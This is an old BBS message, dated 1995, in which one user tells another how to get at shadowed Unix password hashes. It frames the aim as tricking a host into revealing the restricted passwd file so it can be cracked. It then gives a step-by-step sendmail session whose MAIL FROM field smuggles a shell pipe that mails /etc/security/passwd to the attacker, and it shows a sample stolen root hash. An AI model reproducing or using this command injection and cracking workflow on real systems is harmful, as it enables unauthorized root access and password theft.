11

Subj: Re: passwd file                                                 (11/34)
From: Root #1
To  : Lord Balif #10
Date: Mon, Jan 16, 1995 7:03:53 AM

LB> root:x:0:1:0000-Admin(0000):/:

This is an example of a "shadowed" passwd file. The file is world readable and 
exists to provide user information for fingering a particular user -

Login name: root     Real name: 000-Admin(0000)
Directory: /         Shell: ???
Plan:
No Plan

The actual encypted passwd for user 'root' is in one of two places most
likely.. either in a restricted security directory ('/etc/security/passwd') or 
in a special passwd file called master.passwd ('/etc/master.passwd').
ExchangeNET uses the latter format, for instance.

Your job as a UNIX hacker is to somehow trick the host computer into letting
you read the restricted passwd file which contains encrypted passwds. On
obtainting this file, you would run a UNIX passwd cracker on the passwd file.

<pause>       The problem is, the unshadowed passwords are most likely in a file that most
users cannot access -- owned by user 'root' and group 'wheel' for instance,
with a file mode of 600 ('-rw-------  root wheel 58472 passwd'). You will need 
to use a program that your host runs that is allowed to access this file and
have it send the file to you.

Classically, sendmail ran under root's user id (0) and could read this file.
An old bug in sendmail could be employed to execute commands as root, thus
providing a gaping vulnerability for becomming a root user to anyone who could 
access sendmail. In the classic example, getting the shadowed passwd file
could be done like this:

REPEAT BY:

% telnet localhost 25  <-- your site's sendmail port
Trying 127.0.0.1 ...
Connected. Escape character is '^]'.
Welcome to old.smtp.version.site.com STMP sendmail version 1.0
Ready and willing for your command, haqr sir.

(you type) MAIL FROM: "|/bin/mail me@old.smtp.version.site.com
</etc/security/passwd"
250 - Sender OK
RCPT TO: nosuchuser
<pause>       225 - "nosuchuser" User unknown
DATA
230 - Enter message. '.' to end
.
235 OK
QUIT
Connection closed

% wait
% frm
1    Mailer Daemon    No subject - file transmission

% more /var/spool/mail/me
From daemon!localhost ...
.
.
Subject:

root:89JKHkjh\kj1:0:0:Admin:/:/bin/sh
...

%
----

<pause>